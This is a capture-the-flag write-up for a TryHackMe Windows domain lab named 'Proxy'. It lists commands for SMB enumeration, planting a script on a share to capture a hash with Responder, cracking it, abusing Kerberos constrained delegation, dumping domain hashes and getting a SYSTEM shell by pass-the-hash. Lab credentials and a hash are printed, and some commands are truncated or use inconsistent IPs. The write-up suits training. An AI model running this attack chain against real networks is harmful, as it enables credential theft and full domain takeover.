# Proxy

<figure><img src="../.gitbook/assets/image (944).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://tryhackme.com/room/proxychallenge" %}

***

First , Let's use The `nmap` scan to check the which services is running .

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
sudo nmap -sV -sC -Pn 10.48.148.0 -T4
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (945).png" alt=""><figcaption></figcaption></figure>

We can see on the above image we got the smb port open `139,445` let's List The SMB services .

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
smbclient -L //10.49.187.70/ -N
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (946).png" alt=""><figcaption></figcaption></figure>

Then check the content on the inside the services !&#x20;

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
smbclient //10.49.187.70/IT-Shared -N
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (947).png" alt=""><figcaption></figcaption></figure>

File Server Running every 2 minutes .

<figure><img src="../.gitbook/assets/image (949).png" alt=""><figcaption></figcaption></figure>

Then I make a File called `exploit.ps1` and Then i Upload using smbclient .

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
Get-ChildItem \192.168.130.53\icons\
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (950).png" alt=""><figcaption></figcaption></figure>

Then Run The responder after Uploading The file exploit.ps1 .

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
sudo responder -I tun0 -dwv
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (951).png" alt=""><figcaption></figcaption></figure>

Crack Using John .

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (952).png" alt=""><figcaption></figcaption></figure>

Check The More Users with the valid credentials.

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
crackmapexec smb 10.49.187.70 -u svc.scanner -p '1summerlove!' --users
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (953).png" alt=""><figcaption></figcaption></figure>

I used The `bloodhound-python` with the valid credential .

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
sudo bloodhound-python -d ctf.local -u svc.scanner -p 1summerlove! -ns 10.49.187.70 -c all --zip
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (955).png" alt=""><figcaption></figcaption></figure>

Kerberos Constrained Delegation (KCD) Abuse.

<figure><img src="../.gitbook/assets/image (956).png" alt=""><figcaption></figcaption></figure>

Kerberos Constrained Delegation (KCD) Abuse Attack.

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
impacket-getST ctf.local/svc.scanner:'1summerlove!' -spn cifs/DC01.ctf.local -impersonate Administrator -dc-ip 1
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (941).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
export KRB5CCNAME=Administrator@cifs_DC01.ctf.local@CTF.LOCAL.ccache
```
{% endcode %}

Dump The hashes using `impacket-secretsdump` .

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
impacket-secretsdump -k -no-pass ctf.local/Administrator@DC01.ctf.local
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (942).png" alt=""><figcaption></figcaption></figure>

Got The `SYSTEM` level shell using a `impacket-psexec` .

{% code overflow="wrap" lineNumbers="true" expandable="true" %}
```
impacket-psexec -hashes :dd4592176bb3f58eea4e87a8f0eaf270 ctf.local/Administrator@10.48.148.0
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (943).png" alt=""><figcaption></figcaption></figure>

